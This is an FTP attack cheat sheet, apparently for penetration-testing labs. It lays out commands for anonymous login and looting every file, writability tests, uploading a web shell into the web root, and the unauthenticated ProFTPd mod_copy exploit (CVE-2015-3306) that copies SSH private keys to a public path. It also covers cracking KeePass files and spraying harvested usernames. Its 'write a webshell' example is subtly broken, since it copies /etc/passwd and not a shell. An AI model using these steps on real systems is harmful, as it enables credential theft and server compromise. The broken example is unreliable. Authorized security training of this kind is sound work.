## Goal
Extract credentials, SSH keys, config files, or writable-webroot access. FTP is rarely the direct foothold — it's a credential/file source that feeds other services.

**Checklist**
- [ ] anonymous login works? (`230 Login successful`)
- [ ] downloaded every readable file?
- [ ] writable? (`mkdir test` -> `257` = yes)
- [ ] FTP root = web root? -> upload a shell
- [ ] `.ssh/`, `.kdbx`, `.bak`, `.conf`, creds in files?
- [ ] vulnerable version? (vsftpd 2.3.4, ProFTPd 1.3.5)

# Commands

### Step 1: Banner + version
```bash
nmap -p21 -sC -sV --script=ftp-anon,ftp-syst $IP
```

### Step 2: Anonymous login
```bash
ftp -m $IP # user: anonymous   pass: anonymous (or blank)

# non-interactive (grab everything in one go):
ftp -n $IP <<EOF
user anonymous anonymous
ls -la
binary
prompt
mget *
bye
EOF
```

### Step 3: Interactive commands (inside the ftp> session)
```bash
ls -la          # list  (try  ls ../../  for path-traversal escape)
cd <dir>        # change directory
binary          # ALWAYS set binary before downloading non-text files (else corruption)
ascii           # text mode
passive         # toggle passive mode (fixes "150 Opening ..." then hangs)
prompt          # toggle per-file confirm OFF (needed for mget)
get <file>      # download one file
mget *          # download every file in current dir
put <file>      # upload a file (if writable)
mkdir test      # write test -> "257 ... created" = WRITABLE
rmdir test      # clean up
bye             # quit
```

### Step 4: Recursive download (whole share)
```bash
wget -m --no-passive ftp://anonymous:anonymous@$IP        # mirror everything
lftp -e "set ftp:passive-mode true; mirror / ./loot; bye" -u anonymous, ftp://$IP
```

### Step 5: Login with found creds (reuse from other services)
```bash
ftp $IP                      # try user:pass combos found elsewhere
```

### Step 6: ProFTPd 1.3.5 mod_copy — CVE-2015-3306 (no auth)
```bash
nc $IP 21
# copy an SSH key to a readable web path:
SITE CPFR /home/<user>/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
# or write a webshell:
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/shell.php
```

### Helpline
```bash
# WHAT SUCCESS/FAILURE LOOKS LIKE:
#   "230 Login successful" (anonymous) = anonymous FTP -> download EVERYTHING (mget *, cd every dir).
#   "530 Login incorrect" = anonymous blocked -> try ftp:ftp / admin:admin, else move on.
#   "257 ... created" after mkdir = WRITABLE. "550 Permission denied" = read-only.
# WHAT THE FILES MEAN:
#   .txt/.xml/.conf/.bak -> read every one for usernames/passwords/DB creds.
#   .kdbx -> keepass2john -> hashcat -m 13400.   id_rsa/.ssh/ -> chmod 600 -> ssh -i.
#   unfamiliar archive/db/key/doc? general workflow (identify -> classify -> convert -> crack -> verify) = artifact_triage.
#   filenames like tom.zip / anna.zip ARE usernames -> add to users.txt and spray.
# WRITABLE + known web root (/var/www/html or C:\inetpub\wwwroot) -> upload a shell (php or .aspx),
#   browse to it = RCE.
# BANNER = version = exploit: vsftpd 2.3.4 (CVE-2011-2523 backdoor), ProFTPd 1.3.5 (mod_copy CVE-2015-3306),
#   uftpd -> try path traversal (ls ../../../) to escape the FTP root.
# FTP is a credential/file SOURCE, not usually the foothold — loot it, then reuse creds elsewhere.
```
